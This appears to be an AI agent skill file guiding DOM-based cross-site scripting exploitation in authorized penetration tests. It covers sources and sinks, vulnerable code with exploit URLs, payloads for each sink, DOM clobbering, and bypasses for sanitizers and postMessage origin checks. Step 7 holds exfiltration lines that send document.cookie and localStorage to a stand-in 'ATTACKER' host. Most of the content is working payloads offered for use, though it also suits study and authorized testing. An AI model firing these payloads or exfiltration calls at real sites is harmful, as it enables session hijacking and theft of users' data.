---
name: xss-dom
description: >
  Guide DOM-based XSS exploitation during authorized penetration testing.
keywords:
  - DOM XSS
  - DOM-based XSS
  - innerHTML injection
  - eval injection
  - document.write XSS
  - postMessage XSS
  - source and sink
  - client-side XSS
  - JavaScript DOM manipulation
tools:
  - burpsuite
  - DOM Invader
  - domloggerpp
  - domdig
opsec: low
---

# DOM-Based XSS

You are helping a penetration tester exploit DOM-based cross-site scripting. The
vulnerability exists entirely in client-side JavaScript — attacker-controlled
data flows from a source (URL, cookie, postMessage, storage) to a dangerous sink
(innerHTML, eval, document.write) without proper sanitization. The malicious
payload never appears in the HTTP response from the server. All testing is under
explicit written authorization.

## Mode

Check if the user or orchestrator has set a mode:
- **Guided** (default): Before executing any command that sends traffic to a
  target, present the command with a one-line explanation of what it does and
  why. Wait for explicit user approval before executing. Never batch multiple
  target-touching commands without approval — present them one at a time (or as
  a small logical group if they achieve a single objective, e.g., "enumerate SMB
  shares"). Local-only operations (file writes, output parsing, engagement
  logging, hash cracking) do not require approval. At decision forks, present
  options and let the user choose.
- **Autonomous**: Execute end-to-end. Analyze page JavaScript for source-sink
  flows, test identified sinks with appropriate payloads, demonstrate impact.
  Report at milestones.

If unclear, default to guided.

## Engagement Logging

Check for `./engagement/` directory. If absent:
- **Guided**: Ask if the user wants to initialize an engagement directory.
- **Autonomous**: Create it automatically with `activity.md`, `findings.md`, and
  `evidence/`.

When an engagement directory exists, log as you work:
- **Activity** → append to `engagement/activity.md` at milestones (source/sink pair
  identified, DOM XSS confirmed, impact demonstrated, pivot to another skill):
  `### [YYYY-MM-DD HH:MM:SS] xss-dom → <target>` with bullet points of actions/results.
- **Findings** → append to `engagement/findings.md` when a vulnerability is confirmed:
  `## N. Title [Severity]` with target, technique, impact, evidence path, repro command.
- **Evidence** → save significant output to `engagement/evidence/` with descriptive
  filenames (e.g., `xss-dom-source-sink-trace.txt`).

If no engagement directory exists and the user declines to create one, proceed normally.

### Invocation Log

Immediately on activation — before reading state.md or doing any assessment —
log invocation to both the screen and activity.md:

1. **On-screen**: Print `[xss-dom] Activated → <target>` so the operator
   sees which skill is running.
2. **activity.md**: Append:
   ```
   ### [YYYY-MM-DD HH:MM:SS] xss-dom → <target>
   - Invoked (assessment starting)
   ```

**Timestamps:** Replace `[YYYY-MM-DD HH:MM:SS]` with the actual current date
and time. Run `date '+%Y-%m-%d %H:%M:%S'` to get it. Never write the literal
placeholder `[YYYY-MM-DD HH:MM:SS]` — activity.md entries need real timestamps
with date and second precision for timeline reconstruction.

This entry must be written NOW, not deferred. Subsequent milestone entries
append bullet points under this same header.


## State Management

If `engagement/state.md` exists, read it before starting. Use it to:
- Skip re-testing targets, parameters, or vulns already confirmed
- Leverage existing credentials or access for this technique
- Understand what's been tried and failed (check Blocked section)

Write `engagement/state.md` at these checkpoints (not just at completion):
1. **After confirming a vulnerability** — add to Vulns with `[found]`
2. **After successful exploitation** — add credentials, access, pivot paths
3. **Before routing to another skill** — the next skill reads state.md on activation

At each checkpoint and on completion, update the relevant sections of
`engagement/state.md`:
- **Targets**: Add any new hosts, URLs, or services discovered
- **Credentials**: Add any credentials, tokens, or keys recovered
- **Access**: Add or update footholds (shells, sessions, DB access)
- **Vulns**: Add confirmed vulns as one-liners; mark exploited ones `[done]`
- **Pivot Map**: Add new attack paths discovered (X leads to Y)
- **Blocked**: Record what was tried and why it failed

Keep entries compact — one line per item. State.md is a snapshot, not a log.

## Prerequisites

- Access to the target page's JavaScript (view source, browser DevTools)
- Understanding that DOM XSS payloads often go in URL fragments (`#`), which are
  NOT sent to the server
- Tools: browser DevTools (Sources/Console), DOM Invader (Burp Suite built-in),
  domloggerpp (browser extension)

## Step 1: Assess

If not already provided, determine:
1. **Target page** — URL of the page with client-side JavaScript
2. **Suspected source** — where does attacker input enter the DOM? (URL hash, query param, cookie, postMessage, localStorage)
3. **Suspected sink** — where does the data get used unsafely?

Skip if context was already provided.

## Step 2: Identify Sources

Sources are inputs an attacker can control. Check each one:

**URL-based sources:**
```javascript
document.URL
document.documentURI
document.baseURI
location              // location.href, location.hash, location.search, location.pathname
document.referrer
```

**Storage-based sources:**
```javascript
document.cookie
window.name           // persists across cross-origin navigations!
localStorage
sessionStorage
```

**Message-based sources:**
```javascript
// postMessage listener
window.addEventListener('message', function(e) { /* uses e.data unsafely */ })
```

**How to find them:** Search the page's JavaScript for these patterns. In
DevTools → Sources → Search (Ctrl+Shift+F):

```
location.hash
location.search
location.href
document.URL
document.referrer
window.name
postMessage
addEventListener.*message
localStorage.getItem
sessionStorage.getItem
document.cookie
```

## Step 3: Identify Sinks

Sinks are functions/properties where attacker data causes harm.

**HTML injection sinks** (most common for DOM XSS):
```javascript
element.innerHTML = ...
element.outerHTML = ...
element.insertAdjacentHTML(...)
document.write(...)
document.writeln(...)
```

> `innerHTML` blocks `<script>` tags in modern browsers. Use `<img onerror>` instead.

**JavaScript execution sinks:**
```javascript
eval(...)
Function(...)()
setTimeout(string, ...)
setInterval(string, ...)
setImmediate(string, ...)
```

**URL/navigation sinks:**
```javascript
location = ...
location.href = ...
location.assign(...)
location.replace(...)
window.open(...)
```

**jQuery sinks:**
```javascript
$(...)                 // selector injection
$.html(...)
$.append(...)
$.prepend(...)
$.after(...)
$.before(...)
$.parseHTML(...)
$.globalEval(...)
```

## Step 4: Trace the Data Flow

Follow the data from source to sink through the JavaScript code.

**Example 1 — URL hash to innerHTML:**
```javascript
// Vulnerable code
var content = location.hash.substring(1);
document.getElementById('output').innerHTML = content;

// Exploit (payload in URL fragment — not sent to server)
https://TARGET/page#<img src=x onerror=alert(document.domain)>
```

**Example 2 — URL param to document.write:**
```javascript
// Vulnerable code
var search = new URLSearchParams(location.search);
document.write('<h1>Results for: ' + search.get('q') + '</h1>');

// Exploit
https://TARGET/page?q=</h1><script>alert(document.domain)</script>
```

**Example 3 — URL param to eval:**
```javascript
// Vulnerable code
var config = location.search.substring(1);
eval('var settings = {' + config + '}');

// Exploit
https://TARGET/page?};alert(document.domain);//
```

**Example 4 — postMessage to innerHTML:**
```javascript
// Vulnerable code
window.addEventListener('message', function(e) {
  document.getElementById('widget').innerHTML = e.data;
});

// Exploit (from attacker page)
<iframe src="https://TARGET/page" onload="this.contentWindow.postMessage('<img src=x onerror=alert(document.domain)>','*')">
```

**Example 5 — window.name abuse:**
```javascript
// Vulnerable code
document.getElementById('greeting').innerHTML = name;  // resolves to window.name

// Exploit (window.name persists across navigations)
<iframe name="<img src=x onerror=alert(document.domain)>" src="https://TARGET/page">
```

**Example 6 — jQuery selector injection:**
```javascript
// Vulnerable code
$(location.hash);

// Exploit
https://TARGET/page#<img src=x onerror=alert(1)>
```

## Step 5: Sink-Specific Payloads

### innerHTML / outerHTML
`<script>` is blocked — use event handlers:
```html
<img src=x onerror=alert(document.domain)>
<svg onload=alert(document.domain)>
<details open ontoggle=alert(document.domain)>
<iframe srcdoc="<script>alert(document.domain)</script>">
```

### document.write / document.writeln
```html
</h1><script>alert(document.domain)</script>
<script>alert(document.domain)</script>
```

### eval / Function / setTimeout(string)
```javascript
);alert(document.domain);//
'-alert(document.domain)-'
1;alert(document.domain)
```

### location / location.href / location.assign
```
javascript:alert(document.domain)
javascript://%0aalert(document.domain)
```

### jQuery $() selector
```html
<img src=x onerror=alert(1)>
```

### postMessage
Craft an attacker page that sends the payload:
```html
<iframe src="https://TARGET/page" onload="
  this.contentWindow.postMessage('<img src=x onerror=alert(document.domain)>','*')
">
```

## Step 6: DOM Clobbering

When the page references DOM elements by name/id without proper checks, you can
"clobber" expected values by injecting HTML elements with matching names.

```html
<!-- If code does: if (window.config) { url = config.url } -->
<a id=config><a id=config name=url href="javascript:alert(1)">

<!-- If code does: element.innerHTML = defaultText -->
<img name=defaultText src=x onerror=alert(1)>
```

## Step 7: Demonstrate Impact

Same as reflected/stored XSS — cookie theft, session hijacking, phishing:

```javascript
fetch('https://ATTACKER/steal?c='+document.cookie)
fetch('https://ATTACKER/steal?ls='+JSON.stringify(localStorage))
```

For `window.name` + admin flows, exfiltrate secrets from localStorage:
```javascript
fetch('https://ATTACKER/?flag='+encodeURIComponent(localStorage.getItem('flag')))
```

## Step 8: Escalate or Pivot

**Before routing**: Write `engagement/state.md` and append to
`engagement/activity.md` with results so far. The next skill reads state.md
on activation — stale state means duplicate work or missed context.

- **Payload appears in HTTP response too**: May also be reflected — route to **xss-reflected**
- **Payload persists for other users**: Stored DOM XSS — route to **xss-stored**
- **postMessage with no origin check**: Can be exploited cross-origin from any page
- **DOM XSS on login page**: Credential theft via phishing overlay

Update `engagement/state.md` with any new credentials, access, vulns, or pivot paths discovered.

When routing, pass along: source, sink, data flow path, working payload, current mode.

## OPSEC Notes

- DOM XSS is entirely client-side — no server logs of the attack payload
- URL fragment (`#`) payloads are never sent to the server
- postMessage exploits require the victim to visit an attacker-controlled page
- DevTools analysis leaves no artifacts on the target

## Troubleshooting

### Can't Find the Sink
- Use DOM Invader (Burp Suite) — automatically traces sources to sinks
- Use domloggerpp browser extension — logs all DOM property access
- Search JS for known sink patterns (Step 3)
- Check for dynamically loaded scripts — use Network tab to find all JS files

### innerHTML Blocks Script Tags
This is expected in modern browsers. Use:
```html
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe srcdoc="<script>alert(1)</script>">
```

### Payload URL-Encoded by Browser
- URL fragment (`#`) payloads may be URL-encoded by the browser before JS reads them
- Check if the code calls `decodeURIComponent()` on the source
- Try double-encoding or using a source that isn't URL-encoded (cookie, postMessage, window.name)

### DOMPurify or Sanitizer Present
- Check the DOMPurify version — older versions have known bypasses
- Try mutation XSS: `<noscript><p title="</noscript><img src=x onerror=alert(1)>">`
- Check if sanitization is applied to all sources or just some (partial sanitization gaps)
- Check for DOM clobbering to bypass sanitizer configuration

### postMessage Has Origin Check
If the listener checks `event.origin`:
```javascript
window.addEventListener('message', function(e) {
  if (e.origin !== 'https://trusted.com') return;
  // ...
});
```
- Check if the origin check is strict (`===`) or uses `indexOf`/regex (bypassable)
- `e.origin.indexOf('trusted.com')` matches `https://trusted.com.attacker.com`
- Check if any trusted origin has an open redirect or XSS you can chain

### Automated Tools
```bash
# DOM Invader — built into Burp Suite browser
# Enable in Burp → Proxy → Intercept → Open Browser → DOM Invader tab

# domdig — headless Chrome DOM XSS scanner
domdig https://TARGET/page

# domloggerpp — browser extension for monitoring DOM access
# Install from: https://github.com/kevin-mizu/domloggerpp
```
